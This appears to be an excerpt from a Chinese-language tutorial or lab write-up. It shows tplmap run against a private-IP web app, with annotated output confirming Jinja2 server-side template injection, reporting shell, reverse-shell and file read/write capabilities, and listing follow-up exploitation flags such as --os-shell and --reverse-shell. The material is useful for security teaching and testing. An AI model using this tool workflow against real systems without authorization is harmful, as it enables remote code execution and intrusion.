```javascript
root@kali:/mnt/hgfs/共享文件夹/tplmap-master# python tplmap.py -u "http://192.168.1.10:8000/?name=Sea"                             //判断是否是注入点
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if GET parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  GET parameter: name                //说明可以注入，同时给出了详细信息
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

   Shell command execution: ok           //检验出这些利用方法对于目标环境是否可用
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Rerun tplmap providing one of the following options:
                                                                  //可以利用下面这些参数进行进一步的操作
    --os-shell        Run shell on the target
    --os-cmd        Execute shell commands
    --bind-shell PORT      Connect to a shell bind to a target port
    --reverse-shell HOST PORT  Send a shell back to the attacker's port
    --upload LOCAL REMOTE  Upload files to the server
    --download REMOTE LOCAL  Download remote files
```